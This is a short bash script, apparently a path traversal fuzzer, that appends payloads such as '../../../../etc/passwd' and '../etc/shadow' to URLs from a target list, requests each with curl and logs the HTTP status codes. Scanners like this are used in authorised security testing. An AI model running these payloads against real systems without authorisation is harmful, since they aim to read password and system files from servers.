#!/bin/bash
echo "📂 Directory Traversal Detector - Path Injection Fuzzer"

mkdir -p traversal_results

if [[ ! -f traversal_targets.txt ]]; then
  echo "Missing traversal_targets.txt. Provide vulnerable endpoints like /download?file=abc.txt"
  exit 1
fi

PAYLOADS=("../../../../etc/passwd" "../windows/win.ini" "../../boot.ini" "../../../../../../../../etc/shadow")

while read -r target; do
  echo "Testing: $target"
  for payload in "${PAYLOADS[@]}"; do
    url="$target$payload"
    status=$(curl -s -o /dev/null -w "%{http_code}" "$url")
    echo "$url => $status" >> traversal_results/fuzz_results.txt
  done
done < traversal_targets.txt

echo "Traversal testing completed. Check traversal_results/fuzz_results.txt"
